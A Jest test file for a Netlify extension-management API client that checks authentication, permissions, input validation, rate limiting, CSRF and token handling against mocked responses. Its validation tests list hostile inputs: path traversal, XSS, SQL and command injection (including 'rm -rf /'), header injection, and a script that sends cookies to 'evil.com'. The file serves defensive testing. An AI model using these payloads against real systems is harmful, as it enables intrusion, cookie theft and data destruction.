/**
 * Security Tests for Netlify Extension Management System
 *
 * Tests authentication, authorization, input validation,
 * rate limiting, and other security measures.
 */

import { NetlifyApiClient, NetlifyApiError } from '../../lib/netlify-api';
import { createMockSite, createMockExtension, mockApiErrors } from '../factories/netlify-factory';

// Mock fetch for security tests
const mockFetch = jest.fn();
global.fetch = mockFetch;

// Mock JWT verification
const mockJwtVerify = jest.fn();
jest.mock('jsonwebtoken', () => ({
  verify: mockJwtVerify,
  sign: jest.fn(),
  decode: jest.fn()
}));

describe('Netlify Extension Management Security Tests', () => {
  let apiClient: NetlifyApiClient;

  beforeEach(() => {
    jest.clearAllMocks();
    apiClient = new NetlifyApiClient('https://api.test.com', 'valid-jwt-token');
  });

  describe('Authentication Security', () => {
    it('should reject requests without authentication token', async () => {
      const unauthenticatedClient = new NetlifyApiClient('https://api.test.com');

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: () => Promise.resolve({
          code: 'UNAUTHORIZED',
          message: 'Authentication required'
        })
      });

      await expect(unauthenticatedClient.getExtensions())
        .rejects
        .toThrow(NetlifyApiError);

      await expect(unauthenticatedClient.getExtensions())
        .rejects
        .toMatchObject({
          code: 'UNAUTHORIZED',
          message: 'Authentication required'
        });
    });

    it('should reject requests with invalid JWT tokens', async () => {
      const invalidClient = new NetlifyApiClient('https://api.test.com', 'invalid.jwt.token');

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: () => Promise.resolve({
          code: 'INVALID_TOKEN',
          message: 'Invalid or expired token',
          details: { reason: 'signature_mismatch' }
        })
      });

      await expect(invalidClient.getExtensions())
        .rejects
        .toMatchObject({
          code: 'INVALID_TOKEN',
          message: 'Invalid or expired token'
        });
    });

    it('should reject requests with expired JWT tokens', async () => {
      const expiredClient = new NetlifyApiClient('https://api.test.com', 'expired.jwt.token');

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 401,
        json: () => Promise.resolve({
          code: 'TOKEN_EXPIRED',
          message: 'Token has expired',
          details: {
            expiredAt: '2024-01-20T10:00:00Z',
            currentTime: '2024-01-20T11:00:00Z'
          }
        })
      });

      await expect(expiredClient.getExtensions())
        .rejects
        .toMatchObject({
          code: 'TOKEN_EXPIRED',
          message: 'Token has expired'
        });
    });

    it('should validate JWT token structure', async () => {
      const malformedClient = new NetlifyApiClient('https://api.test.com', 'not-a-jwt-token');

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 400,
        json: () => Promise.resolve({
          code: 'MALFORMED_TOKEN',
          message: 'Token format is invalid'
        })
      });

      await expect(malformedClient.getExtensions())
        .rejects
        .toMatchObject({
          code: 'MALFORMED_TOKEN',
          message: 'Token format is invalid'
        });
    });
  });

  describe('Authorization and Permissions', () => {
    it('should enforce site-level permissions', async () => {
      const restrictedSite = createMockSite({ id: 'restricted-site' });

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: () => Promise.resolve({
          code: 'INSUFFICIENT_PERMISSIONS',
          message: 'User does not have access to this site',
          details: {
            siteId: restrictedSite.id,
            requiredRole: 'admin',
            userRole: 'viewer'
          }
        })
      });

      await expect(apiClient.getSiteExtensions(restrictedSite.id))
        .rejects
        .toMatchObject({
          code: 'INSUFFICIENT_PERMISSIONS',
          message: 'User does not have access to this site'
        });
    });

    it('should enforce operation-level permissions', async () => {
      const site = createMockSite({ id: 'test-site' });
      const extension = createMockExtension({ id: 'test-extension' });

      // User can view but not modify extensions
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: () => Promise.resolve({
          code: 'OPERATION_FORBIDDEN',
          message: 'User does not have permission to modify extensions',
          details: {
            operation: 'enable_extension',
            requiredPermission: 'extensions:write',
            userPermissions: ['extensions:read']
          }
        })
      });

      await expect(apiClient.enableExtension(site.id, extension.id))
        .rejects
        .toMatchObject({
          code: 'OPERATION_FORBIDDEN',
          message: 'User does not have permission to modify extensions'
        });
    });

    it('should validate user scope in JWT token', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: () => Promise.resolve({
          code: 'SCOPE_INSUFFICIENT',
          message: 'Token scope does not include required permissions',
          details: {
            requiredScope: 'extensions:write',
            tokenScope: 'extensions:read'
          }
        })
      });

      await expect(apiClient.enableExtension('test-site', 'test-extension'))
        .rejects
        .toMatchObject({
          code: 'SCOPE_INSUFFICIENT',
          message: 'Token scope does not include required permissions'
        });
    });

    it('should enforce organization-level access control', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: () => Promise.resolve({
          code: 'ORG_ACCESS_DENIED',
          message: 'User does not belong to the required organization',
          details: {
            requiredOrg: 'candlefish-ai',
            userOrg: 'external-user'
          }
        })
      });

      await expect(apiClient.getExtensions())
        .rejects
        .toMatchObject({
          code: 'ORG_ACCESS_DENIED',
          message: 'User does not belong to the required organization'
        });
    });
  });

  describe('Input Validation and Sanitization', () => {
    it('should reject malicious site IDs', async () => {
      const maliciousInputs = [
        '../../../etc/passwd',
        '<script>alert("xss")</script>',
        'test-site; DROP TABLE sites;',
        '../../admin/delete',
        'site\x00null-byte'
      ];

      for (const maliciousSiteId of maliciousInputs) {
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: 400,
          json: () => Promise.resolve({
            code: 'INVALID_INPUT',
            message: 'Site ID contains invalid characters',
            details: {
              field: 'siteId',
              value: maliciousSiteId,
              pattern: '^[a-zA-Z0-9-]+$'
            }
          })
        });

        await expect(apiClient.getSiteExtensions(maliciousSiteId))
          .rejects
          .toMatchObject({
            code: 'INVALID_INPUT',
            message: 'Site ID contains invalid characters'
          });
      }
    });

    it('should reject malicious extension IDs', async () => {
      const maliciousExtensionIds = [
        '../../../../etc/passwd',
        '<img src=x onerror=alert(1)>',
        'ext"; DELETE FROM extensions; --',
        'extension\r\nX-Injected: header'
      ];

      for (const maliciousExtId of maliciousExtensionIds) {
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: 400,
          json: () => Promise.resolve({
            code: 'INVALID_EXTENSION_ID',
            message: 'Extension ID format is invalid',
            details: {
              field: 'extensionId',
              value: maliciousExtId
            }
          })
        });

        await expect(apiClient.enableExtension('test-site', maliciousExtId))
          .rejects
          .toMatchObject({
            code: 'INVALID_EXTENSION_ID',
            message: 'Extension ID format is invalid'
          });
      }
    });

    it('should sanitize configuration payloads', async () => {
      const maliciousConfigs = [
        {
          // Script injection attempt
          rule: '<script>fetch("http://evil.com/steal?data="+document.cookie)</script>',
          callback: 'javascript:alert(1)'
        },
        {
          // SQL injection attempt
          query: "'; DROP TABLE configs; --",
          value: "1; SELECT * FROM users WHERE '1'='1"
        },
        {
          // Path traversal attempt
          filePath: '../../../../etc/passwd',
          includePath: '../../../admin/secrets'
        },
        {
          // Command injection attempt
          command: 'ls; cat /etc/passwd',
          script: '`rm -rf /`'
        }
      ];

      for (const maliciousConfig of maliciousConfigs) {
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: 400,
          json: () => Promise.resolve({
            code: 'INVALID_CONFIG',
            message: 'Configuration contains potentially harmful content',
            details: {
              rejectedFields: Object.keys(maliciousConfig),
              reason: 'security_violation'
            }
          })
        });

        await expect(apiClient.updateExtensionConfig('test-site', 'test-extension', maliciousConfig))
          .rejects
          .toMatchObject({
            code: 'INVALID_CONFIG',
            message: 'Configuration contains potentially harmful content'
          });
      }
    });

    it('should enforce payload size limits', async () => {
      const oversizedConfig = {
        config: {
          // Generate very large payload (>1MB)
          data: 'x'.repeat(1024 * 1024 + 1)
        }
      };

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 413,
        json: () => Promise.resolve({
          code: 'PAYLOAD_TOO_LARGE',
          message: 'Request payload exceeds maximum allowed size',
          details: {
            maxSize: '1MB',
            actualSize: '1.0001MB'
          }
        })
      });

      await expect(apiClient.updateExtensionConfig('test-site', 'test-extension', oversizedConfig))
        .rejects
        .toMatchObject({
          code: 'PAYLOAD_TOO_LARGE',
          message: 'Request payload exceeds maximum allowed size'
        });
    });
  });

  describe('Rate Limiting and DoS Protection', () => {
    it('should enforce rate limits for API endpoints', async () => {
      // Simulate multiple rapid requests
      const promises = Array.from({ length: 100 }, () => {
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: 429,
          json: () => Promise.resolve({
            code: 'RATE_LIMITED',
            message: 'Too many requests from this client',
            details: {
              limit: '100/minute',
              remaining: 0,
              resetTime: new Date(Date.now() + 60000).toISOString()
            }
          }),
          headers: {
            'Retry-After': '60',
            'X-RateLimit-Limit': '100',
            'X-RateLimit-Remaining': '0',
            'X-RateLimit-Reset': Math.floor((Date.now() + 60000) / 1000).toString()
          }
        });

        return apiClient.getExtensions().catch(e => e);
      });

      const results = await Promise.all(promises);

      // All should be rate limited
      results.forEach(result => {
        expect(result).toBeInstanceOf(NetlifyApiError);
        expect(result.code).toBe('RATE_LIMITED');
      });
    });

    it('should enforce stricter limits for write operations', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 429,
        json: () => Promise.resolve({
          code: 'WRITE_RATE_LIMITED',
          message: 'Too many write operations from this client',
          details: {
            limit: '10/minute',
            resetTime: new Date(Date.now() + 60000).toISOString(),
            operation: 'enable_extension'
          }
        })
      });

      await expect(apiClient.enableExtension('test-site', 'test-extension'))
        .rejects
        .toMatchObject({
          code: 'WRITE_RATE_LIMITED',
          message: 'Too many write operations from this client'
        });
    });

    it('should implement exponential backoff for repeated violations', async () => {
      const backoffTimes = [1, 2, 4, 8, 16]; // Exponential backoff in minutes

      for (let i = 0; i < backoffTimes.length; i++) {
        mockFetch.mockResolvedValueOnce({
          ok: false,
          status: 429,
          json: () => Promise.resolve({
            code: 'RATE_LIMITED_BACKOFF',
            message: 'Client exceeded rate limits multiple times',
            details: {
              backoffMinutes: backoffTimes[i],
              violationCount: i + 1,
              resetTime: new Date(Date.now() + backoffTimes[i] * 60000).toISOString()
            }
          })
        });

        const error = await apiClient.getExtensions().catch(e => e);
        expect(error.details.backoffMinutes).toBe(backoffTimes[i]);
      }
    });

    it('should detect and block suspicious batch operations', async () => {
      const suspiciousOperations = Array.from({ length: 1000 }, (_, i) => ({
        siteId: `site-${i}`,
        extensionId: `ext-${i}`,
        action: 'enable' as const
      }));

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 429,
        json: () => Promise.resolve({
          code: 'SUSPICIOUS_BATCH',
          message: 'Batch operation flagged as potentially abusive',
          details: {
            operationCount: 1000,
            maxAllowed: 50,
            reason: 'unusual_pattern'
          }
        })
      });

      await expect(apiClient.batchToggleExtensions(suspiciousOperations))
        .rejects
        .toMatchObject({
          code: 'SUSPICIOUS_BATCH',
          message: 'Batch operation flagged as potentially abusive'
        });
    });
  });

  describe('Data Protection and Privacy', () => {
    it('should not leak sensitive information in error messages', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 500,
        json: () => Promise.resolve({
          code: 'INTERNAL_ERROR',
          message: 'An internal error occurred',
          // Should NOT contain sensitive info like:
          // - Database connection strings
          // - API keys
          // - File paths
          // - Stack traces
        })
      });

      const error = await apiClient.getExtensions().catch(e => e);

      expect(error.message).not.toMatch(/password|secret|key|token/i);
      expect(error.message).not.toMatch(/\/usr\/|\/var\/|\/etc\//);
      expect(error.message).not.toMatch(/at\s+\w+\.\w+\s+\(/); // Stack trace pattern
    });

    it('should enforce HTTPS for all API communications', async () => {
      const httpClient = new NetlifyApiClient('http://api.test.com', 'test-token');

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 426,
        json: () => Promise.resolve({
          code: 'HTTPS_REQUIRED',
          message: 'HTTPS is required for all API requests',
          details: {
            upgrade: 'TLS/1.2'
          }
        })
      });

      await expect(httpClient.getExtensions())
        .rejects
        .toMatchObject({
          code: 'HTTPS_REQUIRED',
          message: 'HTTPS is required for all API requests'
        });
    });

    it('should sanitize logs and audit trails', async () => {
      // Test that sensitive data doesn't appear in logs
      const sensitiveConfig = {
        apiKey: `test-api-key-${Math.random().toString(36).substr(2, 9)}`,
        password: `test-password-${Math.random().toString(36).substr(2, 9)}`,
        token: `test-token-${Math.random().toString(36).substr(2, 9)}`
      };

      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 400,
        json: () => Promise.resolve({
          code: 'VALIDATION_ERROR',
          message: 'Invalid configuration provided',
          details: {
            // Sensitive fields should be redacted in logs
            fields: ['apiKey', 'password', 'token'],
            sanitizedConfig: {
              apiKey: '[REDACTED]',
              password: '[REDACTED]',
              token: '[REDACTED]'
            }
          }
        })
      });

      const error = await apiClient.updateExtensionConfig('test-site', 'test-ext', sensitiveConfig).catch(e => e);

      expect(error.details.sanitizedConfig.apiKey).toBe('[REDACTED]');
      expect(error.details.sanitizedConfig.password).toBe('[REDACTED]');
      expect(error.details.sanitizedConfig.token).toBe('[REDACTED]');
    });
  });

  describe('Cross-Site Request Forgery (CSRF) Protection', () => {
    it('should require CSRF tokens for state-changing operations', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: () => Promise.resolve({
          code: 'CSRF_TOKEN_MISSING',
          message: 'CSRF token is required for this operation',
          details: {
            operation: 'enable_extension',
            headerRequired: 'X-CSRF-Token'
          }
        })
      });

      await expect(apiClient.enableExtension('test-site', 'test-extension'))
        .rejects
        .toMatchObject({
          code: 'CSRF_TOKEN_MISSING',
          message: 'CSRF token is required for this operation'
        });
    });

    it('should validate CSRF token authenticity', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: false,
        status: 403,
        json: () => Promise.resolve({
          code: 'CSRF_TOKEN_INVALID',
          message: 'CSRF token is invalid or expired',
          details: {
            providedToken: `invalid-token-${Math.random().toString(36).substr(2, 9)}`,
            reason: 'signature_mismatch'
          }
        })
      });

      await expect(apiClient.enableExtension('test-site', 'test-extension'))
        .rejects
        .toMatchObject({
          code: 'CSRF_TOKEN_INVALID',
          message: 'CSRF token is invalid or expired'
        });
    });
  });

  describe('Content Security Policy (CSP) Violations', () => {
    it('should report CSP violations from client-side code', async () => {
      // Simulate CSP violation report
      const cspViolation = {
        'csp-report': {
          'document-uri': 'https://candlefish.ai/netlify-dashboard',
          'referrer': '',
          'violated-directive': 'script-src',
          'effective-directive': 'script-src',
          'original-policy': "script-src 'self' 'unsafe-inline'",
          'disposition': 'enforce',
          'blocked-uri': 'https://evil.com/malicious.js',
          'status-code': 200,
          'script-sample': ''
        }
      };

      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({
          success: true,
          message: 'CSP violation reported',
          data: { reportId: 'csp-123' }
        })
      });

      // In a real implementation, this would be a CSP report endpoint
      const response = await fetch('/api/csp-report', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(cspViolation)
      });

      expect(response.ok).toBe(true);
    });
  });

  describe('Secure Headers and Response Handling', () => {
    it('should include security headers in responses', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        headers: {
          'X-Content-Type-Options': 'nosniff',
          'X-Frame-Options': 'DENY',
          'X-XSS-Protection': '1; mode=block',
          'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
          'Content-Security-Policy': "default-src 'self'",
          'Referrer-Policy': 'strict-origin-when-cross-origin'
        },
        json: () => Promise.resolve({
          success: true,
          data: { extensions: [] }
        })
      });

      const response = await fetch('/api/extensions');

      expect(response.headers['X-Content-Type-Options']).toBe('nosniff');
      expect(response.headers['X-Frame-Options']).toBe('DENY');
      expect(response.headers['Strict-Transport-Security']).toContain('max-age=31536000');
    });
  });

  describe('Session and Token Management', () => {
    it('should handle token refresh securely', async () => {
      // First request with expired token
      mockFetch
        .mockResolvedValueOnce({
          ok: false,
          status: 401,
          json: () => Promise.resolve({
            code: 'TOKEN_EXPIRED',
            message: 'Token has expired'
          })
        })
        // Token refresh request
        .mockResolvedValueOnce({
          ok: true,
          json: () => Promise.resolve({
            success: true,
            data: {
              accessToken: 'new-access-token',
              expiresIn: 3600,
              tokenType: 'Bearer'
            }
          })
        })
        // Retry with new token
        .mockResolvedValueOnce({
          ok: true,
          json: () => Promise.resolve({
            success: true,
            data: { extensions: [] }
          })
        });

      // Implement automatic token refresh logic
      const refreshableClient = new NetlifyApiClient('https://api.test.com', 'expired-token');

      try {
        await refreshableClient.getExtensions();
      } catch (error) {
        if (error instanceof NetlifyApiError && error.code === 'TOKEN_EXPIRED') {
          // Refresh token and retry
          const newToken = 'new-access-token'; // From refresh response
          const newClient = new NetlifyApiClient('https://api.test.com', newToken);
          const result = await newClient.getExtensions();
          expect(result).toBeDefined();
        }
      }
    });

    it('should revoke tokens on logout', async () => {
      mockFetch.mockResolvedValueOnce({
        ok: true,
        json: () => Promise.resolve({
          success: true,
          message: 'Token revoked successfully'
        })
      });

      // Simulate token revocation
      const response = await fetch('/api/auth/revoke', {
        method: 'POST',
        headers: {
          'Authorization': 'Bearer valid-token',
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({ token: 'valid-token' })
      });

      expect(response.ok).toBe(true);
    });
  });
});
